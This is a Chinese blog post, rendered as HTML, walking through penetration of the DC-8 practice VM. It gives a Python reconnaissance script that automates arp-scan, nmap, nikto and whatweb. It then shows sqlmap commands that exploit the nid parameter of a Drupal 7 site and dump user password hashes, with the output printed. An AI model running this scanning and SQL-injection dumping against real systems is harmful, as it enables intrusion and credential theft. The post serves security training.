@@ -1,0 +1,691 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 4.2.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/favicon.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon.png">
+  <link rel="mask-icon" href="/images/favicon.png" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/font-awesome/5.13.0/css/all.min.css">
+  <link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/pace/1.0.2/themes/blue/pace-theme-minimal.min.css">
+  <script src="//cdn.jsdelivr.net/npm/pace-js@1/pace.min.js"></script>
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"atc96.top","root":"/","scheme":"Muse","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":true,"show_result":true,"style":"mac"},"back2top":{"enable":true,"sidebar":false,"scrollpercent":true},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":true,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":true,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
+  </script>
+
+  <meta name="description" content="DC-8 靶机渗透 1. 渗透过程 THE_END!">
+<meta property="og:type" content="article">
+<meta property="og:title" content="DC-8 靶机渗透">
+<meta property="og:url" content="https://atc96.top/DC-8/index.html">
+<meta property="og:site_name" content="Rex_Surprise">
+<meta property="og:description" content="DC-8 靶机渗透 1. 渗透过程 THE_END!">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://atc96.top/images/mdImages/image-20200503173049526.png">
+<meta property="og:image" content="https://atc96.top/images/mdImages/image-20200504224312509.png">
+<meta property="og:image" content="https://atc96.top/images/mdImages/image-20200504224920158.png">
+<meta property="og:image" content="https://atc96.top/images/mdImages/image-20200504224947210.png">
+<meta property="og:image" content="https://atc96.top/images/mdImages/image-20200504225005560.png">
+<meta property="og:image" content="https://atc96.top/images/mdImages/image-20200504225051840.png">
+<meta property="og:image" content="https://atc96.top/images/mdImages/image-20200504225740483.png">
+<meta property="og:image" content="https://atc96.top/images/mdImages/image-20200504230239506.png">
+<meta property="og:image" content="https://atc96.top/images/mdImages/image-20200504232730631.png">
+<meta property="og:image" content="https://atc96.top/images/mdImages/image-20200504232745210.png">
+<meta property="article:published_time" content="2020-05-09T16:00:00.000Z">
+<meta property="article:modified_time" content="2020-05-10T10:26:17.023Z">
+<meta property="article:author" content="Rex_Surprise">
+<meta property="article:tag" content="网络渗透">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://atc96.top/images/mdImages/image-20200503173049526.png">
+
+<link rel="canonical" href="https://atc96.top/DC-8/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>DC-8 靶机渗透 | Rex_Surprise</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+<link rel="alternate" href="/atom.xml" title="Rex_Surprise" type="application/atom+xml">
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">Rex_Surprise</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+      <p class="site-subtitle" itemprop="description">Welcome to rexSurprise!</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result">
+  <div id="no-result">
+    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+  <div class="reading-progress-bar"></div>
+
+  <a href="https://github.com/rexSurprise" class="github-corner" title="Follow me on GitHub" aria-label="Follow me on GitHub" rel="noopener" target="_blank"><svg width="80" height="80" viewBox="0 0 250 250" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"></path></svg></a>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://atc96.top/DC-8/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="Rex_Surprise">
+      <meta itemprop="description" content="Rex_Surprise的个人博客~">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Rex_Surprise">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          DC-8 靶机渗透
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2020-05-10 00:00:00 / 修改时间：18:26:17" itemprop="dateCreated datePublished" datetime="2020-05-10T00:00:00+08:00">2020-05-10</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F/" itemprop="url" rel="index"><span itemprop="name">靶机渗透</span></a>
+                </span>
+            </span>
+
+          
+            <span id="/DC-8/" class="post-meta-item leancloud_visitors" data-flag-title="DC-8 靶机渗透" title="阅读次数">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">阅读次数：</span>
+              <span class="leancloud-visitors-count"></span>
+            </span>
+            <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv" style="display: none;">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">阅读次数：</span>
+              <span id="busuanzi_value_page_pv"></span>
+            </span>
+  
+  <span class="post-meta-item">
+    
+      <span class="post-meta-item-icon">
+        <i class="far fa-comment"></i>
+      </span>
+      <span class="post-meta-item-text">Valine：</span>
+    
+    <a title="valine" href="/DC-8/#valine-comments" itemprop="discussionUrl">
+      <span class="post-comments-count valine-comment-count" data-xid="/DC-8/" itemprop="commentCount"></span>
+    </a>
+  </span>
+  
+  
+            <span class="post-meta-item" title="阅读时长">
+              <span class="post-meta-item-icon">
+                <i class="far fa-clock"></i>
+              </span>
+              <span>1 分钟</span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <!-- toc -->
+
+<ul>
+<li><a href="#dc-8-靶机渗透">DC-8 靶机渗透</a><ul>
+<li><a href="#1-渗透过程">1. 渗透过程</a></li>
+<li><a href="#__the_end__"><strong>THE_END!</strong></a></li>
+</ul>
+</li>
+</ul>
+<!-- tocstop -->
+
+<a id="more"></a>
+<h1><span id="dc-8-靶机渗透">DC-8 靶机渗透</span></h1><h2><span id="1-渗透过程">1. 渗透过程</span></h2><ul>
+<li>今天我们用一个脚本来做前期的扫描</li>
+</ul>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment"># coding: utf-8</span></span><br><span class="line"><span class="keyword">import</span> commands <span class="keyword">as</span> cmd</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">color = &#123;</span><br><span class="line">    <span class="string">'black'</span> :   <span class="string">'\033[30m'</span>,</span><br><span class="line">    <span class="string">'red'</span>   :   <span class="string">'\033[31m'</span>,</span><br><span class="line">    <span class="string">'green'</span> :   <span class="string">'\033[32m'</span>,</span><br><span class="line">    <span class="string">'yellow'</span>:   <span class="string">'\033[33m'</span>,</span><br><span class="line">    <span class="string">'blue'</span>  :   <span class="string">'\033[34m'</span>,</span><br><span class="line">    <span class="string">'purple'</span>:   <span class="string">'\033[35m'</span>,</span><br><span class="line">    <span class="string">'suffix'</span>:   <span class="string">'\033[0m'</span></span><br><span class="line">&#125;</span><br><span class="line">result = &#123;&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add_color</span><span class="params">(s, c)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> c <span class="keyword">in</span> color.keys():</span><br><span class="line">        <span class="keyword">return</span> color[c] + s + color[<span class="string">'suffix'</span>]</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> s</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">check_adder</span><span class="params">(addr)</span>:</span></span><br><span class="line">    compile_ip = re.compile(</span><br><span class="line">        <span class="string">r'^(1\d&#123;2&#125;|2[0-4]\d|25[0-5]|[1-9]\d|[1-9])\.(1\d&#123;2&#125;|2[0-4]\d|25[0-5]|[1-9]\d|\d)\.(1\d&#123;2&#125;|2[0-4]\d|25[0-5]|[1-9]\d|\d)\.(1\d&#123;2&#125;|2[0-4]\d|25[0-5]|[1-9]\d|\d)$'</span>)</span><br><span class="line">    <span class="keyword">if</span> compile_ip.match(addr):</span><br><span class="line">        <span class="keyword">return</span> addr</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">scan_addr</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">return</span> cmd.getoutput(<span class="string">"arp-scan --interface eth0 192.168.0.0/24 | grep VMware | awk '&#123;print $1&#125;'"</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_adders</span><span class="params">()</span>:</span></span><br><span class="line">    adders = scan_addr().split(<span class="string">'\n'</span>)</span><br><span class="line">    <span class="keyword">if</span> len(adders) &gt; <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">for</span> addr <span class="keyword">in</span> adders: print(add_color(<span class="string">'[*] IP address found:&#123;&#125;'</span>.format(addr), <span class="string">'blue'</span>))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        print(add_color(<span class="string">'[!] No IP address found!'</span>, <span class="string">'yellow'</span>))</span><br><span class="line">        input_addr = input(<span class="string">'Please enter the IP address manually. Multiple IP addresses are separated by ","'</span>)</span><br><span class="line">        adders = [check_adder(addr) <span class="keyword">for</span> addr <span class="keyword">in</span> input_addr.split(<span class="string">','</span>)]</span><br><span class="line">    <span class="keyword">return</span> adders</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">scan_port</span><span class="params">(addr)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> check_adder(addr):</span><br><span class="line">        print(add_color(<span class="string">'[*] Start scanning port of &#123;&#125; ...'</span>.format(addr), <span class="string">'yellow'</span>))</span><br><span class="line">        result[<span class="string">'nmap'</span>] = cmd.getoutput(<span class="string">"nmap -sS -A -p- &#123;&#125;"</span>.format(addr))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">nikto_scan</span><span class="params">(addr)</span>:</span></span><br><span class="line">    print(add_color(<span class="string">'[*] Start scanning Web Services of &#123;&#125;...'</span>.format(addr), <span class="string">'yellow'</span>))</span><br><span class="line">    res = cmd.getoutput(<span class="string">"nikto -host &#123;&#125;"</span>.format(addr))</span><br><span class="line">    errors = re.findall(<span class="string">r'No web server found'</span>, res)</span><br><span class="line">    <span class="keyword">if</span> len(errors) &gt; <span class="number">0</span>:</span><br><span class="line">        print(add_color(<span class="string">'[!] An error was encountered while scanning the Host:&#123;&#125;:80.'</span>.format(addr), <span class="string">'red'</span>))</span><br><span class="line">        host = input(<span class="string">'Please enter the correct URL:\n'</span>)</span><br><span class="line">        res = cmd.getoutput(<span class="string">"nikto -host &#123;&#125;"</span>.format(host))</span><br><span class="line">    result[<span class="string">'nikto'</span>] = res</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">whatweb_scan</span><span class="params">(addr)</span>:</span></span><br><span class="line">    print(add_color(<span class="string">'[*] Start scanning Web information of &#123;&#125;...'</span>.format(addr), <span class="string">'yellow'</span>))</span><br><span class="line">    cs = cmd.getoutput(<span class="string">"whatweb &#123;&#125;"</span>.format(addr))</span><br><span class="line">    _r = re.sub(<span class="string">r'\033\[\d&#123;1,2&#125;m'</span>, <span class="string">''</span>, cs)</span><br><span class="line">    res = _r.split(<span class="string">','</span>)</span><br><span class="line">    ls = [res[<span class="number">-4</span>], res[<span class="number">-3</span>], res[<span class="number">-2</span>]]</span><br><span class="line">    <span class="keyword">del</span> res[<span class="number">-2</span>]</span><br><span class="line">    <span class="keyword">del</span> res[<span class="number">-2</span>]</span><br><span class="line">    <span class="keyword">del</span> res[<span class="number">-2</span>]</span><br><span class="line">    res.append(<span class="string">','</span>.join(ls))</span><br><span class="line">    result[<span class="string">'whatweb'</span>] = res</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 写入输出结果</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">write_result</span><span class="params">(addr)</span>:</span></span><br><span class="line">    ld = [<span class="string">'&gt;&gt;&gt;'</span>, <span class="string">'Language'</span>, <span class="string">'Country'</span>, <span class="string">'Framework'</span>, <span class="string">'Server'</span>, <span class="string">'IP'</span>, <span class="string">'JsFWK'</span>, <span class="string">'MetaGenerator'</span>, <span class="string">'ScriptType'</span>, <span class="string">'Title'</span>,</span><br><span class="line">          <span class="string">'XFO'</span>, <span class="string">'UH'</span>]</span><br><span class="line">    threads = list()</span><br><span class="line">    threads.append(threading.Thread(target=scan_port, args=(addr,)))</span><br><span class="line">    threads.append(threading.Thread(target=nikto_scan, args=(addr,)))</span><br><span class="line">    threads.append(threading.Thread(target=whatweb_scan, args=(addr,)))</span><br><span class="line">    <span class="keyword">for</span> t <span class="keyword">in</span> threads: t.start()</span><br><span class="line">    <span class="keyword">for</span> t <span class="keyword">in</span> threads: t.join()</span><br><span class="line"></span><br><span class="line">    style = <span class="string">'style="background-color:#000;color:#0F0;width:96%;padding:2%;border:2px double #2F2;"'</span></span><br><span class="line">    html = <span class="string">r"""&lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="string">&lt;html style="background-color:#000; color:#FFF;"&gt;</span></span><br><span class="line"><span class="string">&lt;head&gt;</span></span><br><span class="line"><span class="string">  &lt;title&gt;Auto-Scan&lt;/title&gt;</span></span><br><span class="line"><span class="string">  &lt;meta charset="utf-8"/&gt;</span></span><br><span class="line"><span class="string">&lt;/head&gt;</span></span><br><span class="line"><span class="string">&lt;body style="font-size:120%;"&gt;</span></span><br><span class="line"><span class="string"> &lt;center&gt; &lt;h1&gt;Auto-Scan Report - [&#123;ip&#125;]&lt;/h1&gt;&lt;/center&gt;</span></span><br><span class="line"><span class="string"> &lt;center&gt;&lt;h3&gt;Scan-Port&lt;/h3&gt;&lt;/center&gt;</span></span><br><span class="line"><span class="string"> &lt;pre &#123;sy&#125;&gt;&#123;sp&#125;&lt;/pre&gt;</span></span><br><span class="line"><span class="string"> &lt;center&gt;&lt;h3&gt;Scan-WebServer&lt;/h3&gt;&lt;/center&gt;</span></span><br><span class="line"><span class="string"> &lt;pre &#123;sy&#125;&gt;&#123;sw&#125;&lt;/pre&gt;</span></span><br><span class="line"><span class="string"> &lt;center&gt;&lt;h3&gt;Scan-WebServer&lt;/h3&gt;&lt;/center&gt;</span></span><br><span class="line"><span class="string"> &lt;pre &#123;sy&#125;&gt;&lt;table&gt;</span></span><br><span class="line"><span class="string">    &lt;tbody&gt;</span></span><br><span class="line"><span class="string">        &#123;sww&#125;</span></span><br><span class="line"><span class="string">    &lt;/tbody&gt;</span></span><br><span class="line"><span class="string"> &lt;/table&gt;&lt;/pre&gt;</span></span><br><span class="line"><span class="string"> &lt;center&gt; All Rights Reserved &amp;copy; &lt;strong&gt;Auto-Scan&lt;/strong&gt;&lt;/center&gt;</span></span><br><span class="line"><span class="string">&lt;/body&gt;</span></span><br><span class="line"><span class="string">&lt;/html&gt;"""</span>.format(ip=addr,</span><br><span class="line">                  sy=style,</span><br><span class="line">                  sp=result[<span class="string">'nmap'</span>],</span><br><span class="line">                  sw=result[<span class="string">'nikto'</span>],</span><br><span class="line">                  sww=<span class="string">''</span>.join([<span class="string">'&lt;tr&gt;&lt;td&gt;&#123;&#125;&lt;/td&gt;&lt;td&gt;&#123;&#125;&lt;/td&gt;&lt;/tr&gt;'</span>.</span><br><span class="line">                              format(ld[i], result[<span class="string">'whatweb'</span>][i]) <span class="keyword">for</span> i <span class="keyword">in</span> range(len(result[<span class="string">'whatweb'</span>]))]))</span><br><span class="line">    _dir = <span class="string">'Auto-Scan'</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(_dir):</span><br><span class="line">        os.mkdir(_dir, <span class="number">0o755</span>)</span><br><span class="line">    fd = open(<span class="string">'&#123;dir&#125;/&#123;ip&#125;.html'</span>.format(dir=_dir, ip=addr), <span class="string">'w'</span>)</span><br><span class="line">    fd.write(html)</span><br><span class="line">    fd.flush()</span><br><span class="line">    fd.close()</span><br><span class="line">    print(add_color(<span class="string">'[+] IP address:&#123;ip&#125; scan completed, the results are saved in: &#123;dir&#125;/&#123;ip&#125;.html'</span>.format(dir=_dir, ip=addr), <span class="string">'green'</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    <span class="keyword">if</span> sys.platform.startswith(<span class="string">'win'</span>):</span><br><span class="line">        print(add_color(<span class="string">'[-] This script can only be executed under Linux!'</span>, <span class="string">'red'</span>))</span><br><span class="line">        sys.exit(<span class="number">-1</span>)</span><br><span class="line">    banner = <span class="string">r"""</span></span><br><span class="line"><span class="string">                 _                 _____</span></span><br><span class="line"><span class="string">    /\          | |               / ____|</span></span><br><span class="line"><span class="string">   /  \   _   _ | |_  ___  ______| (___    ___  __ _  _ __   _ __    ___  _ __</span></span><br><span class="line"><span class="string">  / /\ \ | | | || __|/ _ \|______|\___ \  / __|/ _` || '_ \ | '_ \  / _ \| '__|</span></span><br><span class="line"><span class="string"> / ____ \| |_| || |_| (_) |       ____) || (__| (_| || | | || | | ||  __/| |</span></span><br><span class="line"><span class="string">/_/    \_\\__,_| \__|\___/       |_____/  \___|\__,_||_| |_||_| |_| \___||_|</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    &#123;&#125;: &#123;&#125;</span></span><br><span class="line"><span class="string">    """</span>.format(add_color(<span class="string">'Author'</span>, <span class="string">'yellow'</span>), add_color(<span class="string">'@Rex_Surprise'</span>, <span class="string">'blue'</span>))</span><br><span class="line">    print(add_color(banner, <span class="string">'purple'</span>))</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">for</span> addr <span class="keyword">in</span> get_adders():threading.Thread(target=write_result, args=(addr,)).start()</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        print(add_color(e, <span class="string">'red'</span>))</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><p>直接执行脚本就完成了<code>ip发现</code>、<code>端口扫描</code>和<code>nikto扫描</code></p>
+</li>
+<li><p>扫描结果：</p>
+</li>
+<li><p><img data-src="../images/mdImages/image-20200503173049526.png" alt="image-20200504221620693"></p>
+</li>
+<li><p>从扫描结果可以看到，IP地址为：<code>192.168.0.29</code> 开放的端口只有 22 和 80</p>
+</li>
+<li><p>然后扫描了Web服务，发现是一个Drupal框架版本是Drupal 7</p>
+</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 搜索一下框架漏洞</span></span><br><span class="line">searchsploit Drupal 7</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>啥也没有，直接去网页看看吧~</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 发现这里有个nid比较刺眼</span></span><br><span class="line">http://192.168.0.29/?nid=1</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>点一个文章nid就变一下，可能有sql输入</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># sqlmap 跑起来</span></span><br><span class="line">sqlmap -u http://192.168.0.29/?nid=1 --dbms mysql --dbs</span><br><span class="line">sqlmap -u http://192.168.0.29/?nid=1 -D d7db --tables</span><br><span class="line">sqlmap -u http://192.168.0.29/?nid=1 -D d7db -T users --column</span><br><span class="line">sqlmap -u http://192.168.0.29/?nid=1 -D d7db -T users -C name,pass --dump</span><br><span class="line"><span class="comment"># 依次执行上面的之后就能得到以下结果</span></span><br><span class="line">+-------+---------------------------------------------------------+</span><br><span class="line">| name  | pass                                                    |</span><br><span class="line">+-------+---------------------------------------------------------+</span><br><span class="line">| admin | <span class="variable">$S</span><span class="variable">$D2tRcYRyqVFNSc0NvYUrYeQbLQg5koMKtihYTIDC9QQqJi3ICg5z</span> |</span><br><span class="line">| john  | <span class="variable">$S</span><span class="variable">$DqupvJbxVmqjr6cYePnx2A891ln7lsuku</span>/3if/oRVZJaz5mKC2vF |</span><br><span class="line">+-------+---------------------------------------------------------+</span><br></pre></td></tr></table></figure>
+
